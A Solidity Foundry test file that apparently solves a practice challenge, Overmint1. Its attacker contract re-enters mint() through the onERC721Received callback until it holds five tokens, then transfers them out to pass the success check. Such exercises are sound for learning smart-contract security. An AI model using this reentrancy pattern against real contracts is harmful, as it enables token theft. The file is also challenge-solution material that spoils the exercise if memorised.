// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.21;

import {Test, console2} from "forge-std/Test.sol";
import {Overmint1} from "../src/Overmint1.sol";
import {IERC721Receiver} from "openzeppelin-contracts/contracts/token/ERC721/IERC721Receiver.sol";

contract PrimeNFTsTest is Test {
    Overmint1 overmint1;
    AttackOvermint1 attackOvermint1;
    address admin;
    address user1;
    address user2;

    function setUp() public {
        admin = address(this);
        user1 = address(0x1);
        user2 = address(0x2);

        overmint1 = new Overmint1();
        attackOvermint1 = new AttackOvermint1(address(overmint1));
    }

    function testAttack() public {
        vm.startPrank(user1);
        attackOvermint1.attack();
        attackOvermint1.retrieveTokens();
        assertTrue(overmint1.success(user1));
    }

}

contract AttackOvermint1 {
    Overmint1 overmint1;

    constructor(address _overmint1) {
        overmint1 = Overmint1(_overmint1);
    }

    function attack() public {
        overmint1.mint();
    }

    function retrieveTokens() public {
        overmint1.transferFrom(address(this), msg.sender, 1);
        overmint1.transferFrom(address(this), msg.sender, 2);
        overmint1.transferFrom(address(this), msg.sender, 3);
        overmint1.transferFrom(address(this), msg.sender, 4);
        overmint1.transferFrom(address(this), msg.sender, 5);
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes calldata
    ) external returns (bytes4) {
        if(overmint1.balanceOf(address(this)) < 5) {
            attack();
        }
        return IERC721Receiver.onERC721Received.selector;
    }
}
